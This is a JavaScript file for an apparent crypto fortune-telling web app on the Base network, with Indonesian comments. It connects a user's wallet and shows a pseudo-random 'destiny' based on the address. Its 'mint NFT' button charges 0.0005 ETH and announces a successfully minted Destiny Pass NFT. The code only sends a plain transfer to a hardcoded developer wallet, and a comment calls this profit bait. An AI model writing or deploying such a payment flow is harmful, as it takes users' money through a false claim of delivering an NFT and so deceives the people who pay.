document.addEventListener('DOMContentLoaded', () => {
    // !!! GANTI ALAMAT DI BAWAH INI DENGAN WALLET BASE ASLI MILIKMU !!!
    const devWalletAddress = "0x14c2ae5921287822af1ae0ea83ca7a0e53954be8";

    const connectBtn = document.getElementById('connect-btn');
    const walletSection = document.getElementById('wallet-section');
    const resultSection = document.getElementById('result-section');
    
    // Elemen Modal Kustom
    const customModal = document.getElementById('custom-modal');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const chooseOkx = document.getElementById('choose-okx');
    const chooseMetamask = document.getElementById('choose-metamask');
    const chooseCoinbase = document.getElementById('choose-coinbase');

    // Elemen Monetisasi Baru
    const shareXBtn = document.getElementById('share-x-btn');
    const mintNftBtn = document.getElementById('mint-nft-btn');
    const donateBtn = document.getElementById('donate-btn');

    const fortuneEmoji = document.getElementById('fortune-emoji');
    const fortuneFate = document.getElementById('fortune-fate');
    const fortuneText = document.getElementById('fortune-text');
    const luckScore = document.getElementById('luck-score');
    const luckBar = document.getElementById('luck-bar');
    const seedAnchor = document.getElementById('seed-anchor');

    let globalConnectedAddress = "";

    const fates = [
        { status: "The Chad Base Whale", emoji: "🐋👑" },
        { status: "Paper Hands Martyr", emoji: "🧻💀" },
        { status: "Gas Fee Ghost", emoji: "👻⛽" },
        { status: "Degen Prophet", emoji: "🔮🚀" },
        { status: "Exit Liquidity Clown", emoji: "🤡💸" },
        { status: "MEV Bot Target", emoji: "🤖🎯" },
        { status: "Meme Coin Archeologist", emoji: "🦖💎" }
    ];

    const predictions = [
        "Your address contains the sacred geometry of an early adopter. A massive ecosystem airdrop is tracking your footsteps, but your patience is dangerously thin.",
        "The smart contract gods frown upon your past panic sells. A mysterious whale is watching your address, waiting for you to sleep to trigger a flash crash.",
        "The stars aligned on the Base network when this wallet was generated. Generational wealth is close, but your propensity to buy the absolute top remains active.",
        "Your wallet address screams chaotic energy. You are highly protected against dusting attacks, but your next transaction will likely be frontrun by a sandwich bot.",
        "Horror awaits your portfolio if you open phishing links today. However, your luck indicator shows a weird spike in low-cap memecoin multipliers this week."
    ];

    const currentDappUrl = window.location.href;

    // 1. Logika Utama Koneksi Wallet
    async function handleConnectClick() {
        const injectedProvider = window.ethereum || (window.okxwallet && window.okxwallet.ethereum);
        
        if (injectedProvider) {
            try {
                connectBtn.innerHTML = `Connecting...`;
                const accounts = await injectedProvider.request({ method: 'eth_requestAccounts' });
                if (accounts && accounts[0]) {
                    handleWalletConnected(accounts[0]);
                }
            } catch (error) {
                console.error(error);
                alert("Connection rejected by user.");
                connectBtn.innerHTML = `<span>🔮</span> Connect Wallet`;
            }
        } else {
            customModal.classList.remove('hidden');
        }
    }

    // 2. Klik Peluncur Dompet
    chooseOkx.addEventListener('click', () => { customModal.classList.add('hidden'); window.location.href = `okx://wallet/dapp/details?dappUrl=${encodeURIComponent(currentDappUrl)}`; });
    chooseMetamask.addEventListener('click', () => { customModal.classList.add('hidden'); window.location.href = `https://metamask.app.link/dapp/${currentDappUrl.replace('https://', '').replace('http://', '')}`; });
    chooseCoinbase.addEventListener('click', () => { customModal.classList.add('hidden'); window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentDappUrl)}`; });
    closeModalBtn.addEventListener('click', () => { customModal.classList.add('hidden'); });

    function handleWalletConnected(address) {
        globalConnectedAddress = address;
        walletSection.innerHTML = `
            <div class="bg-slate-950 border border-blue-500/30 p-3 rounded-2xl text-[11px] text-blue-400 font-mono flex justify-between items-center w-full">
                <span>Connected: ${address.slice(0,6)}...${address.slice(-4)}</span>
                <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
            </div>
        `;
        generatePrediction(address);
    }

    function generatePrediction(address) {
        const cleanAddress = address.replace('0x', '');
        const lastFour = cleanAddress.slice(-4); 
        const seedNumber = parseInt(lastFour, 16) || 777; 

        const chosenFate = fates[seedNumber % fates.length];
        const chosenText = predictions[(seedNumber + 2) % predictions.length];
        const calculatedLuck = (seedNumber % 91) + 10; 

        resultSection.classList.remove('hidden');

        fortuneEmoji.innerText = chosenFate.emoji;
        fortuneFate.innerText = chosenFate.status;
        fortuneText.innerText = chosenText;
        luckScore.innerText = `${calculatedLuck}%`;
        seedAnchor.innerText = `#${lastFour.toUpperCase()}`;

        setTimeout(() => { luckBar.style.width = `${calculatedLuck}%`; }, 200);

        // A. ENGINE VIRAL: Pasang Tweet Otomatis ke Tombol X
        const tweetText = encodeURIComponent(`🔮 My Base wallet destiny has been spoken! I scored ${calculatedLuck}% Degen Luck and became "${chosenFate.status}" on Base Forecaster.\n\nCheck your fate here: ${currentDappUrl} @Base`);
        shareXBtn.onclick = () => {
            window.open(`https://twitter.com/intent/tweet?text=${tweetText}`, '_blank');
        };

        // B. ENGINE NFT PREMIUM (Pancingan Cuan Minting)
        mintNftBtn.onclick = async () => {
            alert(`⚠️ Premium Feature Locked!\n\nTo mint your "${chosenFate.status}" Destiny Pass as an on-chain NFT, you need to pay a small processing fee of 0.0005 ETH. Proceed to wallet approval?`);
            await executeTransaction("0.0005", "Destiny Pass NFT minted successfully! Check your wallet collection tab.");
        };

        // C. ENGINE DONASI (Tipping)
        donateBtn.onclick = async () => {
            await executeTransaction("0.001", "Thank you for the support, true Chad! Your luck score has secretly doubled in the cosmos.");
        };
    }

    // Fungsi Pengirim Transaksi Otomatis (Penghasil Uang Utama)
    async function executeTransaction(amountInEth, successAlert) {
        const injectedProvider = window.ethereum || (window.okxwallet && window.okxwallet.ethereum);
        if (!injectedProvider) {
            alert("Please open this app inside OKX Wallet / MetaMask browser to complete transactions.");
            return;
        }

        if (devWalletAddress === "ALAMAT_WALLET_BASE_KAMU_DISINI") {
            alert("Error: Developer wallet address is not set yet in script.js!");
            return;
        }

        try {
            // Konversi ETH ke format Hexadecimal Wei bawaan Web3
            const valueHex = "0x" + (parseFloat(amountInEth) * 1e18).toString(16);
            
            const txParams = {
                from: globalConnectedAddress,
                to: devWalletAddress,
                value: valueHex,
                chainId: '0x2105' // Mengunci transaksi murni hanya di Jaringan Base Mainnet (8453)
            };

            await injectedProvider.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });

            alert(`🎉 Success! ${successAlert}`);
        } catch (error) {
            console.error(error);
            alert("Transaction failed or cancelled by user.");
        }
    }

    connectBtn.addEventListener('click', handleConnectClick);

    setTimeout(() => {
        const injectedProvider = window.ethereum || (window.okxwallet && window.okxwallet.ethereum);
        if (injectedProvider && injectedProvider.selectedAddress) {
            handleWalletConnected(injectedProvider.selectedAddress);
        }
    }, 500);
});
                                     
